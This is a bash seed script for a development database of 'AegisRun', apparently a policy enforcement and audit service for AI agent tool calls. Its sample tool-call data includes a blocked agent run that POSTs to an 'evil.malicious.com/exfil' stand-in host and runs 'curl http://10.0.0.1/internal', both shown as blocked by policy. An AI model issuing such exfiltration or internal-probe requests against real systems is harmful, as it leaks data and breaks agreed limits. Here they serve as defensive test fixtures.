#!/usr/bin/env bash
# AegisRun Development Seed Data Script
# Seeds the database with sample data for development and testing

set -euo pipefail

# Configuration with defaults
DB_HOST="${DB_HOST:-localhost}"
DB_PORT="${DB_PORT:-5432}"
DB_USER="${DB_USER:-aegisrun}"
DB_PASSWORD="${DB_PASSWORD:-aegisrun_dev}"
DB_NAME="${DB_NAME:-aegisrun_dev}"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

log_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

log_warn() {
    echo -e "${YELLOW}[WARN]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Execute SQL
exec_sql() {
    PGPASSWORD="${DB_PASSWORD}" psql -h "${DB_HOST}" -p "${DB_PORT}" -U "${DB_USER}" -d "${DB_NAME}" -q "$@"
}

# Check database connection
check_connection() {
    log_info "Checking database connection..."
    
    if ! exec_sql -c '\q' 2>/dev/null; then
        log_error "Cannot connect to database. Is PostgreSQL running?"
        exit 1
    fi
    
    log_success "Database connection successful."
}

# Generate ULID-like IDs (simplified for bash)
generate_id() {
    # Generate a timestamp-based ID similar to ULID
    local timestamp
    timestamp=$(date +%s%N | cut -c1-13)
    local random
    random=$(head -c 16 /dev/urandom | xxd -p | cut -c1-16 | tr '[:lower:]' '[:upper:]')
    echo "${timestamp}${random}" | cut -c1-26 | tr '[:lower:]' '[:upper:]'
}

# Seed organizations
seed_organizations() {
    log_info "Seeding organizations..."
    
    exec_sql << 'EOF'
-- Development organization
INSERT INTO organizations (org_id, name, slug, metadata)
VALUES 
    ('01JQZX3K2FGH9VWBCD45DEVORG', 'Development Org', 'dev-org', '{"tier": "enterprise", "features": ["all"]}'),
    ('01JQZX3K2FGH9VWBCD45TSTORG', 'Test Organization', 'test-org', '{"tier": "team", "features": ["basic"]}'),
    ('01JQZX3K2FGH9VWBCD45DMOORG', 'Demo Organization', 'demo-org', '{"tier": "demo", "features": ["demo"]}')
ON CONFLICT (org_id) DO NOTHING;
EOF
    
    log_success "Organizations seeded."
}

# Seed users
seed_users() {
    log_info "Seeding users..."
    
    exec_sql << 'EOF'
-- Development users
INSERT INTO users (user_id, org_id, email, name, oidc_subject, role)
VALUES 
    -- Dev Org users
    ('01JQZX3K2FGH9VWBCD45ADMN01', '01JQZX3K2FGH9VWBCD45DEVORG', 'admin@aegisrun.local', 'Admin User', 'oidc|admin', 'org_admin'),
    ('01JQZX3K2FGH9VWBCD45DEVL01', '01JQZX3K2FGH9VWBCD45DEVORG', 'developer@aegisrun.local', 'Developer User', 'oidc|developer', 'developer'),
    ('01JQZX3K2FGH9VWBCD45PLCY01', '01JQZX3K2FGH9VWBCD45DEVORG', 'policy@aegisrun.local', 'Policy Admin', 'oidc|policy', 'policy_admin'),
    ('01JQZX3K2FGH9VWBCD45APPR01', '01JQZX3K2FGH9VWBCD45DEVORG', 'approver@aegisrun.local', 'Approver User', 'oidc|approver', 'approver'),
    ('01JQZX3K2FGH9VWBCD45VIEW01', '01JQZX3K2FGH9VWBCD45DEVORG', 'viewer@aegisrun.local', 'Viewer User', 'oidc|viewer', 'viewer'),
    
    -- Test Org users
    ('01JQZX3K2FGH9VWBCD45TSTUSR', '01JQZX3K2FGH9VWBCD45TSTORG', 'test@aegisrun.local', 'Test User', 'oidc|test', 'developer'),
    
    -- Demo Org users
    ('01JQZX3K2FGH9VWBCD45DMOUSR', '01JQZX3K2FGH9VWBCD45DMOORG', 'demo@aegisrun.local', 'Demo User', 'oidc|demo', 'org_admin')
ON CONFLICT (user_id) DO NOTHING;
EOF
    
    log_success "Users seeded."
}

# Seed signing keys
seed_signing_keys() {
    log_info "Seeding signing keys..."
    
    # Generate dummy Ed25519 keys (these are NOT secure - for dev only)
    exec_sql << 'EOF'
INSERT INTO signing_keys (key_id, org_id, public_key, private_key, status)
VALUES 
    ('01JQZX3K2FGH9VWBCD45KEY001', '01JQZX3K2FGH9VWBCD45DEVORG', 
     decode('302a300506032b6570032100', 'hex') || gen_random_bytes(32),
     decode('302e020100300506032b6570', 'hex') || gen_random_bytes(32),
     'active'),
    ('01JQZX3K2FGH9VWBCD45KEY002', '01JQZX3K2FGH9VWBCD45TSTORG',
     decode('302a300506032b6570032100', 'hex') || gen_random_bytes(32),
     decode('302e020100300506032b6570', 'hex') || gen_random_bytes(32),
     'active'),
    ('01JQZX3K2FGH9VWBCD45KEY003', '01JQZX3K2FGH9VWBCD45DMOORG',
     decode('302a300506032b6570032100', 'hex') || gen_random_bytes(32),
     decode('302e020100300506032b6570', 'hex') || gen_random_bytes(32),
     'active')
ON CONFLICT (key_id) DO NOTHING;
EOF
    
    log_success "Signing keys seeded."
}

# Seed policies
seed_policies() {
    log_info "Seeding policies..."
    
    exec_sql << 'EOF'
-- Default permissive policy
INSERT INTO policies (policy_id, org_id, name, version, status, spec, spec_hash, created_by, approved_at, approved_by, deployed_at)
VALUES 
    ('01JQZX3K2FGH9VWBCD45POL001', '01JQZX3K2FGH9VWBCD45DEVORG', 'default-policy', 'v1', 'deployed',
     '{
         "tools": [
             {"name": "http_request", "action": "allow", "conditions": []},
             {"name": "file_read", "action": "allow", "conditions": ["args.path.startsWith(\"/allowed\")"]},
             {"name": "shell_exec", "action": "require_approval", "conditions": []},
             {"name": "*", "action": "warn", "conditions": []}
         ],
         "budgets": {
             "max_tool_calls": 100,
             "max_wall_clock_sec": 300,
             "max_retries": 3,
             "max_bytes_egressed": 10485760
         },
         "egress_controls": {
             "domain_allowlist": ["api.github.com", "api.openai.com", "*.aegisrun.local"],
             "domain_denylist": ["*.malicious.com"],
             "block_private_ips": true
         },
         "redaction": {
             "patterns": ["\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Z|a-z]{2,}\\b", "sk-[a-zA-Z0-9]{48}"],
             "mask_strategy": "redact"
         }
     }',
     'a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2',
     '01JQZX3K2FGH9VWBCD45PLCY01',
     NOW() - INTERVAL '1 day',
     '["01JQZX3K2FGH9VWBCD45APPR01"]',
     NOW() - INTERVAL '1 day'
    ),
    -- Strict policy for production-like testing
    ('01JQZX3K2FGH9VWBCD45POL002', '01JQZX3K2FGH9VWBCD45DEVORG', 'strict-policy', 'v1', 'deployed',
     '{
         "tools": [
             {"name": "http_request", "action": "allow", "conditions": ["args.url.startsWith(\"https://api.github.com\")"]},
             {"name": "file_read", "action": "block", "conditions": []},
             {"name": "shell_exec", "action": "block", "conditions": []},
             {"name": "*", "action": "block", "conditions": []}
         ],
         "budgets": {
             "max_tool_calls": 10,
             "max_wall_clock_sec": 60,
             "max_retries": 1,
             "max_bytes_egressed": 1048576
         },
         "egress_controls": {
             "domain_allowlist": ["api.github.com"],
             "domain_denylist": ["*"],
             "block_private_ips": true
         },
         "redaction": {
             "patterns": [".*"],
             "mask_strategy": "hash"
         }
     }',
     'b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3',
     '01JQZX3K2FGH9VWBCD45PLCY01',
     NOW() - INTERVAL '2 days',
     '["01JQZX3K2FGH9VWBCD45APPR01"]',
     NOW() - INTERVAL '2 days'
    ),
    -- Draft policy for testing workflow
    ('01JQZX3K2FGH9VWBCD45POL003', '01JQZX3K2FGH9VWBCD45DEVORG', 'experimental-policy', 'v1', 'draft',
     '{
         "tools": [
             {"name": "*", "action": "allow", "conditions": []}
         ],
         "budgets": {
             "max_tool_calls": 1000,
             "max_wall_clock_sec": 3600,
             "max_retries": 10,
             "max_bytes_egressed": 104857600
         },
         "egress_controls": {
             "domain_allowlist": ["*"],
             "domain_denylist": [],
             "block_private_ips": false
         },
         "redaction": {
             "patterns": [],
             "mask_strategy": "redact"
         }
     }',
     'c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4',
     '01JQZX3K2FGH9VWBCD45PLCY01',
     NULL,
     NULL,
     NULL
    )
ON CONFLICT (policy_id) DO NOTHING;
EOF
    
    log_success "Policies seeded."
}

# Seed sample runs
seed_runs() {
    log_info "Seeding sample runs..."
    
    exec_sql << 'EOF'
-- Sample completed run
INSERT INTO runs (run_id, org_id, policy_id, policy_version, metadata, status, created_at, ended_at, outcome, counters, signer_key_id)
VALUES 
    ('01JQZX3K2FGH9VWBCD45RUN001', '01JQZX3K2FGH9VWBCD45DEVORG', '01JQZX3K2FGH9VWBCD45POL001', 'v1',
     '{"environment": "development", "agent": "demo-agent", "tags": ["demo", "compliant"]}',
     'completed',
     NOW() - INTERVAL '1 hour',
     NOW() - INTERVAL '50 minutes',
     '{"result": "success", "exit_reason": "completed_normally"}',
     '{"steps": 5, "tool_calls": 12, "bytes_egressed": 4096, "retries": 0, "blocks": 0}',
     '01JQZX3K2FGH9VWBCD45KEY001'
    ),
    -- Sample blocked run
    ('01JQZX3K2FGH9VWBCD45RUN002', '01JQZX3K2FGH9VWBCD45DEVORG', '01JQZX3K2FGH9VWBCD45POL002', 'v1',
     '{"environment": "development", "agent": "malicious-agent", "tags": ["demo", "blocked"]}',
     'blocked',
     NOW() - INTERVAL '45 minutes',
     NOW() - INTERVAL '44 minutes',
     '{"error": "Policy violation: tool blocked", "exit_reason": "policy_blocked"}',
     '{"steps": 2, "tool_calls": 3, "bytes_egressed": 0, "retries": 0, "blocks": 1}',
     '01JQZX3K2FGH9VWBCD45KEY001'
    ),
    -- Sample running run
    ('01JQZX3K2FGH9VWBCD45RUN003', '01JQZX3K2FGH9VWBCD45DEVORG', '01JQZX3K2FGH9VWBCD45POL001', 'v1',
     '{"environment": "development", "agent": "long-running-agent", "tags": ["demo", "running"]}',
     'running',
     NOW() - INTERVAL '10 minutes',
     NULL,
     NULL,
     '{"steps": 3, "tool_calls": 7, "bytes_egressed": 2048, "retries": 1, "blocks": 0}',
     '01JQZX3K2FGH9VWBCD45KEY001'
    ),
    -- Sample failed run
    ('01JQZX3K2FGH9VWBCD45RUN004', '01JQZX3K2FGH9VWBCD45DEVORG', '01JQZX3K2FGH9VWBCD45POL001', 'v1',
     '{"environment": "development", "agent": "failing-agent", "tags": ["demo", "failed"]}',
     'failed',
     NOW() - INTERVAL '2 hours',
     NOW() - INTERVAL '1 hour 55 minutes',
     '{"error": "Agent error: unexpected exception", "exit_reason": "agent_error"}',
     '{"steps": 4, "tool_calls": 8, "bytes_egressed": 1024, "retries": 3, "blocks": 0}',
     '01JQZX3K2FGH9VWBCD45KEY001'
    )
ON CONFLICT (run_id) DO NOTHING;
EOF
    
    log_success "Runs seeded."
}

# Seed steps
seed_steps() {
    log_info "Seeding steps..."
    
    exec_sql << 'EOF'
-- Steps for completed run
INSERT INTO steps (step_id, run_id, seq_no, name, state_vector, status, started_at, ended_at)
VALUES 
    ('01JQZX3K2FGH9VWBCD45STP001', '01JQZX3K2FGH9VWBCD45RUN001', 0, 'initialize', '{"phase": "init"}', 'completed', NOW() - INTERVAL '1 hour', NOW() - INTERVAL '59 minutes'),
    ('01JQZX3K2FGH9VWBCD45STP002', '01JQZX3K2FGH9VWBCD45RUN001', 1, 'plan', '{"phase": "planning", "tasks": 3}', 'completed', NOW() - INTERVAL '59 minutes', NOW() - INTERVAL '57 minutes'),
    ('01JQZX3K2FGH9VWBCD45STP003', '01JQZX3K2FGH9VWBCD45RUN001', 2, 'execute', '{"phase": "execution", "progress": 100}', 'completed', NOW() - INTERVAL '57 minutes', NOW() - INTERVAL '52 minutes'),
    ('01JQZX3K2FGH9VWBCD45STP004', '01JQZX3K2FGH9VWBCD45RUN001', 3, 'validate', '{"phase": "validation"}', 'completed', NOW() - INTERVAL '52 minutes', NOW() - INTERVAL '51 minutes'),
    ('01JQZX3K2FGH9VWBCD45STP005', '01JQZX3K2FGH9VWBCD45RUN001', 4, 'finalize', '{"phase": "done"}', 'completed', NOW() - INTERVAL '51 minutes', NOW() - INTERVAL '50 minutes'),
    
    -- Steps for blocked run
    ('01JQZX3K2FGH9VWBCD45STP006', '01JQZX3K2FGH9VWBCD45RUN002', 0, 'initialize', '{"phase": "init"}', 'completed', NOW() - INTERVAL '45 minutes', NOW() - INTERVAL '44 minutes 30 seconds'),
    ('01JQZX3K2FGH9VWBCD45STP007', '01JQZX3K2FGH9VWBCD45RUN002', 1, 'exfiltrate', '{"phase": "attack"}', 'failed', NOW() - INTERVAL '44 minutes 30 seconds', NOW() - INTERVAL '44 minutes'),
    
    -- Steps for running run
    ('01JQZX3K2FGH9VWBCD45STP008', '01JQZX3K2FGH9VWBCD45RUN003', 0, 'initialize', '{"phase": "init"}', 'completed', NOW() - INTERVAL '10 minutes', NOW() - INTERVAL '9 minutes'),
    ('01JQZX3K2FGH9VWBCD45STP009', '01JQZX3K2FGH9VWBCD45RUN003', 1, 'processing', '{"phase": "work", "progress": 50}', 'completed', NOW() - INTERVAL '9 minutes', NOW() - INTERVAL '5 minutes'),
    ('01JQZX3K2FGH9VWBCD45STP010', '01JQZX3K2FGH9VWBCD45RUN003', 2, 'long_task', '{"phase": "processing", "progress": 75}', 'running', NOW() - INTERVAL '5 minutes', NULL)
ON CONFLICT (step_id) DO NOTHING;
EOF
    
    log_success "Steps seeded."
}

# Seed tool calls
seed_tool_calls() {
    log_info "Seeding tool calls..."
    
    exec_sql << 'EOF'
-- Tool calls for completed run
INSERT INTO tool_calls (tool_call_id, run_id, step_id, seq_no, tool_name, args, decision, response, requested_at, responded_at)
VALUES 
    ('01JQZX3K2FGH9VWBCD45TC0001', '01JQZX3K2FGH9VWBCD45RUN001', '01JQZX3K2FGH9VWBCD45STP003', 0, 'http_request',
     '{"url": "https://api.github.com/users/octocat", "method": "GET"}',
     '{"action": "allow", "policy_rule_id": "rule-001", "reason": "Allowed by policy"}',
     '{"result": {"login": "octocat", "id": 1}, "duration_ms": 150}',
     NOW() - INTERVAL '56 minutes', NOW() - INTERVAL '55 minutes 58 seconds'),
    ('01JQZX3K2FGH9VWBCD45TC0002', '01JQZX3K2FGH9VWBCD45RUN001', '01JQZX3K2FGH9VWBCD45STP003', 1, 'file_read',
     '{"path": "/allowed/config.json"}',
     '{"action": "allow", "policy_rule_id": "rule-002", "reason": "Path in allowlist"}',
     '{"result": {"content": "{}"}, "duration_ms": 5}',
     NOW() - INTERVAL '55 minutes', NOW() - INTERVAL '54 minutes 59 seconds'),
    
    -- Tool calls for blocked run (including blocked call)
    ('01JQZX3K2FGH9VWBCD45TC0003', '01JQZX3K2FGH9VWBCD45RUN002', '01JQZX3K2FGH9VWBCD45STP006', 0, 'http_request',
     '{"url": "https://api.github.com/rate_limit", "method": "GET"}',
     '{"action": "allow", "policy_rule_id": "rule-001", "reason": "Allowed by policy"}',
     '{"result": {}, "duration_ms": 100}',
     NOW() - INTERVAL '44 minutes 45 seconds', NOW() - INTERVAL '44 minutes 44 seconds'),
    ('01JQZX3K2FGH9VWBCD45TC0004', '01JQZX3K2FGH9VWBCD45RUN002', '01JQZX3K2FGH9VWBCD45STP007', 1, 'http_request',
     '{"url": "https://evil.malicious.com/exfil", "method": "POST", "body": "[REDACTED]"}',
     '{"action": "block", "policy_rule_id": "rule-egress-001", "reason": "Domain in denylist: *.malicious.com"}',
     NULL,
     NOW() - INTERVAL '44 minutes 30 seconds', NOW() - INTERVAL '44 minutes 29 seconds'),
    ('01JQZX3K2FGH9VWBCD45TC0005', '01JQZX3K2FGH9VWBCD45RUN002', '01JQZX3K2FGH9VWBCD45STP007', 2, 'shell_exec',
     '{"command": "curl http://10.0.0.1/internal"}',
     '{"action": "block", "policy_rule_id": "rule-shell-001", "reason": "shell_exec blocked by policy"}',
     NULL,
     NOW() - INTERVAL '44 minutes 15 seconds', NOW() - INTERVAL '44 minutes 14 seconds'),
    
    -- Tool calls for running run
    ('01JQZX3K2FGH9VWBCD45TC0006', '01JQZX3K2FGH9VWBCD45RUN003', '01JQZX3K2FGH9VWBCD45STP009', 0, 'http_request',
     '{"url": "https://api.openai.com/v1/chat/completions", "method": "POST"}',
     '{"action": "allow", "policy_rule_id": "rule-001", "reason": "Allowed by policy"}',
     '{"result": {"id": "chatcmpl-123"}, "duration_ms": 2500}',
     NOW() - INTERVAL '8 minutes', NOW() - INTERVAL '7 minutes 57 seconds')
ON CONFLICT (tool_call_id) DO NOTHING;
EOF
    
    log_success "Tool calls seeded."
}

# Seed events
seed_events() {
    log_info "Seeding events..."
    
    exec_sql << 'EOF'
-- Events for completed run (simplified chain)
INSERT INTO events (event_id, run_id, seq_no, event_type, timestamp, payload, prev_hash, event_hash)
VALUES 
    ('01JQZX3K2FGH9VWBCD45EVT001', '01JQZX3K2FGH9VWBCD45RUN001', 0, 'run.started', 
     NOW() - INTERVAL '1 hour',
     '{"run_id": "01JQZX3K2FGH9VWBCD45RUN001", "policy_ref": {"policy_id": "01JQZX3K2FGH9VWBCD45POL001", "version": "v1"}}',
     NULL,
     'a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b1'),
    ('01JQZX3K2FGH9VWBCD45EVT002', '01JQZX3K2FGH9VWBCD45RUN001', 1, 'step.started',
     NOW() - INTERVAL '1 hour',
     '{"step_id": "01JQZX3K2FGH9VWBCD45STP001", "name": "initialize"}',
     'a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b1',
     'b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c2'),
    ('01JQZX3K2FGH9VWBCD45EVT003', '01JQZX3K2FGH9VWBCD45RUN001', 2, 'step.ended',
     NOW() - INTERVAL '59 minutes',
     '{"step_id": "01JQZX3K2FGH9VWBCD45STP001", "status": "completed"}',
     'b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c2',
     'c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3c3'),
    ('01JQZX3K2FGH9VWBCD45EVT004', '01JQZX3K2FGH9VWBCD45RUN001', 3, 'tool.requested',
     NOW() - INTERVAL '56 minutes',
     '{"tool_call_id": "01JQZX3K2FGH9VWBCD45TC0001", "tool_name": "http_request"}',
     'c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3c3',
     'd4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4d4'),
    ('01JQZX3K2FGH9VWBCD45EVT005', '01JQZX3K2FGH9VWBCD45RUN001', 4, 'tool.decided',
     NOW() - INTERVAL '56 minutes',
     '{"tool_call_id": "01JQZX3K2FGH9VWBCD45TC0001", "decision": "allow"}',
     'd4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4d4',
     'e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5e5'),
    ('01JQZX3K2FGH9VWBCD45EVT006', '01JQZX3K2FGH9VWBCD45RUN001', 5, 'run.ended',
     NOW() - INTERVAL '50 minutes',
     '{"run_id": "01JQZX3K2FGH9VWBCD45RUN001", "status": "completed", "outcome": {"result": "success"}}',
     'e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5e5',
     'f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6f6'),
    
    -- Events for blocked run
    ('01JQZX3K2FGH9VWBCD45EVT007', '01JQZX3K2FGH9VWBCD45RUN002', 0, 'run.started',
     NOW() - INTERVAL '45 minutes',
     '{"run_id": "01JQZX3K2FGH9VWBCD45RUN002"}',
     NULL,
     '1a2b3c4d5e6f1a2b3c4d5e6f1a2b3c4d5e6f1a2b3c4d5e6f1a2b3c4d5e6f1a2a'),
    ('01JQZX3K2FGH9VWBCD45EVT008', '01JQZX3K2FGH9VWBCD45RUN002', 1, 'tool.decided',
     NOW() - INTERVAL '44 minutes',
     '{"tool_call_id": "01JQZX3K2FGH9VWBCD45TC0004", "decision": "block", "reason": "Domain in denylist"}',
     '1a2b3c4d5e6f1a2b3c4d5e6f1a2b3c4d5e6f1a2b3c4d5e6f1a2b3c4d5e6f1a2a',
     '2b3c4d5e6f1a2b3c4d5e6f1a2b3c4d5e6f1a2b3c4d5e6f1a2b3c4d5e6f1a2b2b'),
    ('01JQZX3K2FGH9VWBCD45EVT009', '01JQZX3K2FGH9VWBCD45RUN002', 2, 'run.ended',
     NOW() - INTERVAL '44 minutes',
     '{"run_id": "01JQZX3K2FGH9VWBCD45RUN002", "status": "blocked"}',
     '2b3c4d5e6f1a2b3c4d5e6f1a2b3c4d5e6f1a2b3c4d5e6f1a2b3c4d5e6f1a2b2b',
     '3c4d5e6f1a2b3c4d5e6f1a2b3c4d5e6f1a2b3c4d5e6f1a2b3c4d5e6f1a2b3c3c')
ON CONFLICT (event_id) DO NOTHING;
EOF
    
    log_success "Events seeded."
}

# Seed audit log
seed_audit_log() {
    log_info "Seeding audit log..."
    
    exec_sql << 'EOF'
INSERT INTO audit_log (audit_id, org_id, user_id, action, resource_type, resource_id, changes, timestamp)
VALUES 
    ('01JQZX3K2FGH9VWBCD45AUD001', '01JQZX3K2FGH9VWBCD45DEVORG', '01JQZX3K2FGH9VWBCD45PLCY01', 'create', 'policy', '01JQZX3K2FGH9VWBCD45POL001',
     '{"name": "default-policy", "version": "v1"}',
     NOW() - INTERVAL '3 days'),
    ('01JQZX3K2FGH9VWBCD45AUD002', '01JQZX3K2FGH9VWBCD45DEVORG', '01JQZX3K2FGH9VWBCD45APPR01', 'approve', 'policy', '01JQZX3K2FGH9VWBCD45POL001',
     '{"decision": "approved", "comment": "LGTM"}',
     NOW() - INTERVAL '2 days'),
    ('01JQZX3K2FGH9VWBCD45AUD003', '01JQZX3K2FGH9VWBCD45DEVORG', '01JQZX3K2FGH9VWBCD45ADMN01', 'deploy', 'policy', '01JQZX3K2FGH9VWBCD45POL001',
     '{"status": "deployed"}',
     NOW() - INTERVAL '1 day'),
    ('01JQZX3K2FGH9VWBCD45AUD004', '01JQZX3K2FGH9VWBCD45DEVORG', '01JQZX3K2FGH9VWBCD45ADMN01', 'create', 'signing_key', '01JQZX3K2FGH9VWBCD45KEY001',
     '{"algorithm": "Ed25519"}',
     NOW() - INTERVAL '5 days')
ON CONFLICT (audit_id) DO NOTHING;
EOF
    
    log_success "Audit log seeded."
}

# Clean seed data (for reset)
clean_seed_data() {
    log_warn "Cleaning existing seed data..."
    
    exec_sql << 'EOF'
-- Delete in reverse dependency order
DELETE FROM audit_log WHERE org_id IN ('01JQZX3K2FGH9VWBCD45DEVORG', '01JQZX3K2FGH9VWBCD45TSTORG', '01JQZX3K2FGH9VWBCD45DMOORG');
DELETE FROM events WHERE run_id IN (SELECT run_id FROM runs WHERE org_id IN ('01JQZX3K2FGH9VWBCD45DEVORG', '01JQZX3K2FGH9VWBCD45TSTORG', '01JQZX3K2FGH9VWBCD45DMOORG'));
DELETE FROM tool_calls WHERE run_id IN (SELECT run_id FROM runs WHERE org_id IN ('01JQZX3K2FGH9VWBCD45DEVORG', '01JQZX3K2FGH9VWBCD45TSTORG', '01JQZX3K2FGH9VWBCD45DMOORG'));
DELETE FROM steps WHERE run_id IN (SELECT run_id FROM runs WHERE org_id IN ('01JQZX3K2FGH9VWBCD45DEVORG', '01JQZX3K2FGH9VWBCD45TSTORG', '01JQZX3K2FGH9VWBCD45DMOORG'));
DELETE FROM runs WHERE org_id IN ('01JQZX3K2FGH9VWBCD45DEVORG', '01JQZX3K2FGH9VWBCD45TSTORG', '01JQZX3K2FGH9VWBCD45DMOORG');
DELETE FROM approvals WHERE policy_id IN (SELECT policy_id FROM policies WHERE org_id IN ('01JQZX3K2FGH9VWBCD45DEVORG', '01JQZX3K2FGH9VWBCD45TSTORG', '01JQZX3K2FGH9VWBCD45DMOORG'));
DELETE FROM policies WHERE org_id IN ('01JQZX3K2FGH9VWBCD45DEVORG', '01JQZX3K2FGH9VWBCD45TSTORG', '01JQZX3K2FGH9VWBCD45DMOORG');
DELETE FROM signing_keys WHERE org_id IN ('01JQZX3K2FGH9VWBCD45DEVORG', '01JQZX3K2FGH9VWBCD45TSTORG', '01JQZX3K2FGH9VWBCD45DMOORG');
DELETE FROM sessions WHERE user_id IN (SELECT user_id FROM users WHERE org_id IN ('01JQZX3K2FGH9VWBCD45DEVORG', '01JQZX3K2FGH9VWBCD45TSTORG', '01JQZX3K2FGH9VWBCD45DMOORG'));
DELETE FROM users WHERE org_id IN ('01JQZX3K2FGH9VWBCD45DEVORG', '01JQZX3K2FGH9VWBCD45TSTORG', '01JQZX3K2FGH9VWBCD45DMOORG');
DELETE FROM organizations WHERE org_id IN ('01JQZX3K2FGH9VWBCD45DEVORG', '01JQZX3K2FGH9VWBCD45TSTORG', '01JQZX3K2FGH9VWBCD45DMOORG');
EOF
    
    log_success "Seed data cleaned."
}

# Print summary
print_summary() {
    echo ""
    echo "============================================"
    echo "  Seed Data Summary"
    echo "============================================"
    echo ""
    
    exec_sql << 'EOF'
SELECT 'Organizations' as entity, COUNT(*) as count FROM organizations
UNION ALL
SELECT 'Users', COUNT(*) FROM users
UNION ALL
SELECT 'Policies', COUNT(*) FROM policies
UNION ALL
SELECT 'Signing Keys', COUNT(*) FROM signing_keys
UNION ALL
SELECT 'Runs', COUNT(*) FROM runs
UNION ALL
SELECT 'Steps', COUNT(*) FROM steps
UNION ALL
SELECT 'Tool Calls', COUNT(*) FROM tool_calls
UNION ALL
SELECT 'Events', COUNT(*) FROM events
UNION ALL
SELECT 'Audit Logs', COUNT(*) FROM audit_log;
EOF
    
    echo ""
    log_info "Default credentials:"
    echo "  Admin:     admin@aegisrun.local (org_admin)"
    echo "  Developer: developer@aegisrun.local (developer)"
    echo "  Policy:    policy@aegisrun.local (policy_admin)"
    echo "  Approver:  approver@aegisrun.local (approver)"
    echo "  Viewer:    viewer@aegisrun.local (viewer)"
    echo ""
}

# Print usage
print_usage() {
    echo "Usage: $0 [OPTIONS]"
    echo ""
    echo "Options:"
    echo "  --clean     Clean existing seed data before seeding"
    echo "  --reset     Alias for --clean"
    echo "  -h, --help  Show this help message"
    echo ""
    echo "Environment variables:"
    echo "  DB_HOST     Database host (default: localhost)"
    echo "  DB_PORT     Database port (default: 5432)"
    echo "  DB_USER     Database user (default: aegisrun)"
    echo "  DB_PASSWORD Database password (default: aegisrun_dev)"
    echo "  DB_NAME     Database name (default: aegisrun_dev)"
}

# Main execution
main() {
    local clean_first=false
    
    # Parse arguments
    while [[ $# -gt 0 ]]; do
        case $1 in
            --clean|--reset)
                clean_first=true
                shift
                ;;
            -h|--help)
                print_usage
                exit 0
                ;;
            *)
                log_error "Unknown option: $1"
                print_usage
                exit 1
                ;;
        esac
    done
    
    echo ""
    echo "============================================"
    echo "  AegisRun Development Seed Data"
    echo "============================================"
    echo ""
    
    check_connection
    
    if [ "$clean_first" = true ]; then
        clean_seed_data
    fi
    
    seed_organizations
    seed_users
    seed_signing_keys
    seed_policies
    seed_runs
    seed_steps
    seed_tool_calls
    seed_events
    seed_audit_log
    
    print_summary
    
    log_success "Seed data loaded successfully!"
    echo ""
}

# Run main function
main "$@"
